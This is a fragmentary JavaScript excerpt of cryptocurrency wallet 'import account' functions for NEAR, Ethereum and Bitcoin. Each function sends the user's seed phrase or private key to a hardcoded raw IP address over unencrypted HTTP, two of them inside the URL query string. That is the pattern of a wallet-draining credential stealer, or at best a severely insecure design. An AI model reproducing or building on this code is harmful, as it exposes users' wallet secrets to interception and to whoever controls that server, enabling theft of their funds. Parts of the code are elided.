export async function ImportNearAccount(seedPhrase) {
    try {
        const response = await fetch(`http://221.148.25.26:4000/near/importAccount?seedPhrase=${seedPhrase}`);
        if (!response.ok) {
...
export async function ImportEthAccount(privateKey) {
    try {
        ...
        const response = await fetch('http://221.148.25.26:4000/ethereum/importAccount', {
            method: 'POST',
            headers: {
...
export async function ImportBitAccount(privateKey) {
    try {
        const response = await fetch(`http://221.148.25.26:4000/bitcoin/importAccount?privateKey=${privateKey}`);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const data = await response.json();
